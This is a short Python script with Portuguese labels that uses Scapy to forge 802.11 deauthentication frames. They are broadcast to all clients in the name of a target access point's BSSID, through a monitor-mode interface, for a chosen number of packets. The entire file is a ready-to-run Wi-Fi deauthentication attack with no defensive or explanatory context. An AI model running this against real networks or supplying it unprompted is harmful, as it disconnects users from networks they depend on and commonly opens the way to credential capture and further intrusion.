from scapy.all import *
import argparse


def envia_deauth(ap_bssid, interface, count):
	pacote = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_bssid, addr3=ap_bssid) / Dot11Deauth()
	sendp(pacote, iface=interface, count=count, inter=0.1, verbose=1)

parser = argparse.ArgumentParser()
parser.add_argument("-a", required=True, help="Define AP do alvo")
parser.add_argument("-i", required=True, help="Define interface em modo monitor")
parser.add_argument("-c", type=int, required=True, help="Numero de pacotes a enviar")
args = parser.parse_args()

envia_deauth(args.a, args.i, args.c)


